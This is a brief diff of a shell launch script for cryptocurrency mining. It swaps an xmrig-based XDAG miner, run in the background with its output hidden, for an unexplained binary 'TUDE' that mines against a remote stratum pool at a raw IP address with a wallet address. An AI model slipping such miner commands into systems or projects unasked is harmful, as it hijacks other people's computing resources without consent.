@@ -1,3 +1,2 @@
-chmod 777 xmrig xmrig2xdag config.json
-./xmrig2xdag -c config.json > /dev/null 2>&1 &
-./xmrig -o 127.0.0.1:3232. -u NBLLjmZp2bOewMv9IM4jV+XdWF7L4GuC -p x -a rx/xdag
+chmod +x TUDE
+./TUDE -a minotaurx  -o stratum+tcps://51.79.177.216:17068 -u RRPp2nA9kqeGqERzefhdGSzfzcmevRtFXr
